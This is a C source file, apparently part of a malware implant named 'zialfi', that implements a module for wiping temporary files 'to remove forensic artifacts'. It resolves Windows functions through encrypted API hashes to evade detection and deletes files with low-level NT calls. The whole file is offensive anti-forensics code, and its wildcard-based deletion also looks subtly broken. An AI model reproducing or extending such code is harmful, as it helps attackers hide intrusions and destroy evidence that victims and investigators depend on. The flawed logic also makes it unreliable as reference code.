/*
 * temp_wipe.c — Temporary file cleanup for zialfi
 *
 * Wipes TMP/TEMP directories to remove forensic artifacts.
 * Translated from Zig temp_wipe.zig.
 *
 * Uses NT NtDeleteFile for each file via NtSetInformationFile or direct NT API.
 * Resolves TMP/TEMP environment variables via hash-resolved GetEnvironmentVariableW.
 */

#include "temp_wipe.h"
#include "config.h"
#include "engine.h"

#ifdef ENABLE_TEMP_WIPE
#include "peb.h"
#include "hash.h"
#include "export_resolve.h"
#include "nt_types.h"
#include <string.h>

/* ── Resolved function pointers ─────────────────────────────── */

typedef DWORD (*FnGetEnvironmentVariableW)(PWSTR, PWSTR, DWORD);

/* ── Helper: load kernel32 ──────────────────────────────────── */

static void *load_kernel32(void)
{
    return mirage_get_module_by_hash(
        mirage_encrypted_hash_module("kernel32.dll"));
}

/* ── Helper: ASCII to wide ──────────────────────────────────── */

static int ascii_to_wide(const char *src, wchar_t *dst, size_t dst_chars)
{
    size_t i;
    for (i = 0; src[i] && i < dst_chars - 1; i++)
        dst[i] = (wchar_t)(unsigned char)src[i];
    dst[i] = 0;
    return (int)i;
}

/* ── Helper: wide to ASCII ──────────────────────────────────── */

static int wide_to_ascii(const wchar_t *src, size_t src_len, char *dst, size_t dst_chars)
{
    size_t i;
    for (i = 0; i < src_len && i < dst_chars - 1; i++) {
        dst[i] = (src[i] < 0x80) ? (char)(unsigned char)src[i] : '?';
    }
    dst[i] = 0;
    return (int)i;
}

/* ════════════════════════════════════════════════════════════════
 *  Get environment variable (wide)
 * ════════════════════════════════════════════════════════════════ */

static int get_env_w(const char *name, wchar_t *buf, DWORD buf_chars)
{
    void *k32 = load_kernel32();
    if (!k32) return 0;

    FnGetEnvironmentVariableW pGetEnv = (FnGetEnvironmentVariableW)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func("GetEnvironmentVariableW"));
    if (!pGetEnv) return 0;

    wchar_t name_w[128];
    ascii_to_wide(name, name_w, 128);

    return (int)pGetEnv(name_w, buf, buf_chars);
}

/* ════════════════════════════════════════════════════════════════
 *  Delete single file via NT API
 *  Translated from Zig tryDeleteFile.
 *
 *  Uses NtCreateFile + NtSetInformationFile(FileDispositionInformation).
 *  Falls back to NtDeleteFile if the engine wrapper is available.
 * ════════════════════════════════════════════════════════════════ */

void temp_wipe_file(const char *path)
{
    if (!path || path[0] == 0) return;

    wchar_t path_w[1024];
    int path_len = ascii_to_wide(path, path_w, 1024);
    if (path_len == 0) return;

    UNICODE_STRING us;
    us.Length        = (USHORT)(path_len * sizeof(wchar_t));
    us.MaximumLength = (USHORT)(sizeof(path_w));
    us.Buffer        = path_w;

    OBJECT_ATTRIBUTES oa;
    oa.Length                   = sizeof(oa);
    oa.RootDirectory            = NULL;
    oa.ObjectName               = &us;
    oa.Attributes               = OBJ_CASE_INSENSITIVE;
    oa.SecurityDescriptor       = NULL;
    oa.SecurityQualityOfService = NULL;

    /* Try NtDeleteFile if engine supports it */
    NTSTATUS del_status = mirage_NtDeleteFile(&oa);
    if (del_status >= 0) return;

    /* Fallback: NtCreateFile + NtSetInformationFile */
    HANDLE handle;
    IO_STATUS_BLOCK iosb;

    NTSTATUS status = mirage_NtCreateFile(
        &handle,
        0x00010080,     /* DELETE | FILE_READ_ATTRIBUTES */
        &oa,
        &iosb,
        NULL,
        0,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    if (status < 0) return;

    FILE_DISPOSITION_INFORMATION fdi;
    fdi.DoDelete = 1;

    mirage_NtSetInformationFile(
        handle,
        &iosb,
        &fdi,
        sizeof(fdi),
        13 /* FileDispositionInformation */
    );

    mirage_NtClose(handle);
}

/* ════════════════════════════════════════════════════════════════
 *  Wipe temp directory
 *  Translated from Zig wipeTempDirectory.
 *
 *  Resolves TMP/TEMP env vars, then deletes common patterns:
 *    *.tmp, *.log, ~*, *.bak
 * ════════════════════════════════════════════════════════════════ */

void temp_wipe_directory(void)
{
    /* Resolve TMP first, then TEMP */
    wchar_t tmp_buf[4096];
    int tmp_len = get_env_w("TMP", tmp_buf, 4096);
    if (tmp_len == 0)
        tmp_len = get_env_w("TEMP", tmp_buf, 4096);
    if (tmp_len == 0) return;

    /* Convert wide path to ASCII */
    char temp_path[4096];
    wide_to_ascii(tmp_buf, tmp_len, temp_path, 4096);
    size_t temp_len = strlen(temp_path);
    if (temp_len == 0) return;

    /* Patterns to delete */
    static const char *patterns[] = {
        "*.tmp",
        "*.log",
        "~*",
        "*.bak",
    };
    static const int num_patterns = 4;

    for (int p = 0; p < num_patterns; p++) {
        char full[4200];
        size_t plen = strlen(patterns[p]);
        if (temp_len + 1 + plen >= sizeof(full)) continue;

        memcpy(full, temp_path, temp_len);
        full[temp_len] = '\\';
        memcpy(full + temp_len + 1, patterns[p], plen);
        full[temp_len + 1 + plen] = 0;

        temp_wipe_file(full);
    }
}

#endif /* ENABLE_TEMP_WIPE */
